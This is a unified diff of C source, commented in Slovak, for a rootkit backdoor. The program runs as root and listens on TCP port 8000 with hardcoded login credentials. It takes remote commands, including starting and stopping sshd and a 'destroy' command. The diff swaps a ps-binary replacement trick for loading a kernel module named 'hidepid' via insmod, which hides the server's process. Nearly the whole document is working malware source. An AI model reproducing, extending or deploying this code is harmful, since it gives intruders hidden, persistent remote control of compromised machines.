@@ -13,7 +13,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
-#include <strings.h>
+#include <string.h>
 #include <string.h>
 #include <arpa/inet.h>
 #include <pthread.h>
@@ -22,14 +22,18 @@
 #include <signal.h>
 #include <fcntl.h>
 
-/*#define DEBUG*/
+#define DEBUG
+
+#define ROOTKIT_MODULE_SYS_PATH "/sys/module/hidepid/"
+#define MODULE_NAME "hidepid"
 
 #define SERVER_PORT 8000
 #define BUFFER_SIZE 256
 #define CMD_SIZE_COUNT 10
 #define BACKLOG_QUEUE 5
-#define AUTH_LOGIN "klient"
-#define AUTH_PASSWD "heslo"
+#define AUTH_LOGIN "client"
+#define AUTH_PASSWD "password"
+
 
 #define LOGIN_FAILED_MSG "Login failed: "
 #define HELLO_MSG "-----------------------\n\tWelcome!\n-----------------------\n\n"
@@ -65,15 +69,16 @@ void sigint_handle(int sig){
 	clean_hide_binary();
 }
 
-
-int main(int argc, char **argv)
-{
+int main(void){
 	/* kontrola ci je root */
-	if(getuid() != 0){
+	if(getuid() != 0){		
 		printf("Program must be run as root\n");
 		return 1;
 	}
 
+	app_pid = getpid();
+	init_hide_binary();
+	
 #ifdef DEBUG
 	printf("Application pid: %d\n",getpid());
 #endif
@@ -93,7 +98,7 @@ int main(int argc, char **argv)
 	struct sockaddr_in client_addr;
 	pthread_attr_t attr;
 	int res, client_len, yes = 1;
-	app_pid = getpid();
+	
 
 	/* inicializacia atributov pre vlakno */
 	if((res = pthread_attr_init(&attr)) != 0){
@@ -120,7 +125,8 @@ int main(int argc, char **argv)
 	}
 
 	/* Inicializacia addries socketu */
-	bzero((char *) &server_addr,sizeof(server_addr));
+	memset(&server_addr,0,sizeof(server_addr));
+	/*bzero((char *) &server_addr,sizeof(server_addr));*/
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_addr.s_addr = INADDR_ANY;
 	server_addr.sin_port = htons(SERVER_PORT);
@@ -191,7 +197,8 @@ void *handle_client(void* param){
 		if(quit_client) break;
 
 		/* nastavenie bufferu */
-		bzero(buffer,BUFFER_SIZE);
+		memset(buffer,0,BUFFER_SIZE);
+		/*bzero(buffer,BUFFER_SIZE);*/
 
 		/* auth. klienta */
 		if(!logged){
@@ -226,8 +233,9 @@ int auth_user(int client_socket,char buffer[]){
 	if(strcmp(buffer,AUTH_LOGIN) == 0) auth_login = 1;
 
 
-	bzero(buffer,BUFFER_SIZE);
-
+	/*bzero(buffer,BUFFER_SIZE);*/
+	memset(buffer,0,BUFFER_SIZE);
+	
 	write_msg(client_socket,"Password: ");
 	if((n = read(client_socket,buffer,BUFFER_SIZE)) < 0){
 		perror("Reading from socket");
@@ -237,7 +245,8 @@ int auth_user(int client_socket,char buffer[]){
 	buffer[strlen(AUTH_PASSWD)] = '\0';
 	if(strcmp(buffer,AUTH_PASSWD) == 0) auth_passwd = 1;
 
-	bzero(buffer,BUFFER_SIZE);
+	/*bzero(buffer,BUFFER_SIZE);*/
+	memset(buffer,0,BUFFER_SIZE);
 
 #ifdef DEBUG
 	printf("login: %d\npasswd: %d\n",auth_login,auth_passwd);
@@ -281,8 +290,8 @@ int read_cmd(int client_socket, char buffer[]){
 
 
 	int i = 0;
-    char *ret_token;        									  /* naparsovany parameter */
-    char *rest = (char *)malloc(sizeof(char)*BUFFER_SIZE);        /* treba inicializovat inak warning */
+    char *ret_token;        									  	/* naparsovany parameter */
+    char *rest = (char *)malloc(sizeof(char)*BUFFER_SIZE);       	/* treba inicializovat inak warning */
     char *cmds[BUFFER_SIZE];
 
     /* prechadza cely retazec a vytvara pole prikazu a jeho parametrov */
@@ -296,21 +305,25 @@ int read_cmd(int client_socket, char buffer[]){
         buffer = rest;
     }
 
-
+	/* spracovanie prikazu */
     if(i > 3) {
-    	write_msg(client_socket,"Unsupported command\n");
+		
+		write_msg(client_socket,"Unsupported command\n");
+		
     }else{
+		/* odpoj klienta */
+		if(strstr(cmds[0],"exit") != NULL) {
+			return 1;
+		}
 
-    	if(strstr(cmds[0],"exit") != NULL) {
-    		return 1;
-    	}
+		/* ukonci sever a odpoj klienta  */
+		if(strstr(cmds[0],"destroy") != NULL) {
+			clean_hide_binary();
+			exit(0);
+		}
 
-    	if(strstr(cmds[0],"destroy") != NULL) {
-    		clean_hide_binary();
-    		exit(0);
-    	}
-
-    	call_cmd(cmds,client_socket);
+		/* ostatne prikazy */
+		call_cmd(cmds,client_socket);
     }
 
     return 0;
@@ -319,13 +332,12 @@ int read_cmd(int client_socket, char buffer[]){
 
 void call_cmd(char *cmds[BUFFER_SIZE], int client_socket){
 
-	/*printf("%s\n",cmds[0]);*/
-
+	/* inicalizacia  */
 	if(strstr(cmds[0],"init") != NULL) {
 	    init_hide_binary();
-	    write_msg(client_socket,"hidden\n");
+	    write_msg(client_socket,"rootkit hidden\n");
 	    return;
-	}
+	}/* sshd server prikazy */
 	else if(strcmp(cmds[0],"sshd") == 0){
 
 		if(strstr(cmds[1],"start") != NULL){
@@ -358,7 +370,7 @@ void call_cmd(char *cmds[BUFFER_SIZE], int client_socket){
 int file_exists(const char *filename){
 
 	FILE *fp;
-
+	
 	if ((fp = fopen(filename, "r"))){
         fclose(fp);
         return 1;
@@ -367,50 +379,33 @@ int file_exists(const char *filename){
 }
 
 void init_hide_binary(){
+	
+	char command_buff[200];
+	
+	/* ak existuje tak netreba inicializovat */
+	if(file_exists(ROOTKIT_MODULE_SYS_PATH))
+		return;
+	
+	sprintf(command_buff,"insmod ./%s.ko server_pid=\"%d\"",MODULE_NAME,(int)app_pid);
 
-	/* subor je uz inicializovany, tak nic nerob */
-	if(file_exists(BACKUP_PS_PATH)) return;
-
-	/* existuje skompilovany podvrhnuty ps */
-	if(file_exists(COMPILED_PS_PATH)){
-		/* naskor vytvor zalohu original suboru */
-		int source_orig = open(PS_PATH, O_RDONLY, 0);
-		int dest_orig = open(BACKUP_PS_PATH, O_WRONLY | O_CREAT, 0644);
-		copy_file(source_orig,dest_orig);
-
-		/* nakopiruj podvrhnuty */
-		int source_compiled = open(COMPILED_PS_PATH, O_RDONLY, 0);
-		int dest_compiled = open(PS_PATH, O_WRONLY | O_CREAT, 0644);
-		copy_file(source_compiled,dest_compiled);
-	}
+#ifdef DEBUG
+	printf("hiding rootkit\n");
+#endif
+	system(command_buff);	
 }
 
 void clean_hide_binary(){
-
-	/* neexistuje zaloha ps suboru -> koniec */
-	if(!file_exists(BACKUP_PS_PATH)) return;
-
-	/* nakopiruj zalohu */
-	int source_backup = open(BACKUP_PS_PATH, O_RDONLY, 0);
-	int dest_backup = open(PS_PATH, O_WRONLY | O_CREAT, 0644);
-	copy_file(source_backup,dest_backup);
-
-	/* odstran zalohu */
-	if(unlink(BACKUP_PS_PATH) == -1){
-		perror("unlink() backup file");
-	}
-
-}
-
-void copy_file(int source, int dest){
-
-	char buf[BUFSIZ];
-	size_t size;
-
-	while ((size = read(source, buf, BUFSIZ)) > 0){
-		write(dest, buf, size);
-	}
-
-	close(source);
-	close(dest);
+	
+	char command_buff[200];
+	
+	/* ak neexistuje tak neodstranuj */
+	if(!file_exists(ROOTKIT_MODULE_SYS_PATH))
+		return;
+	
+#ifdef DEBUG
+	printf("rootkit cleaning\n");
+#endif
+	
+	sprintf(command_buff,"rmmod -f %s",MODULE_NAME);
+	system(command_buff);
 }
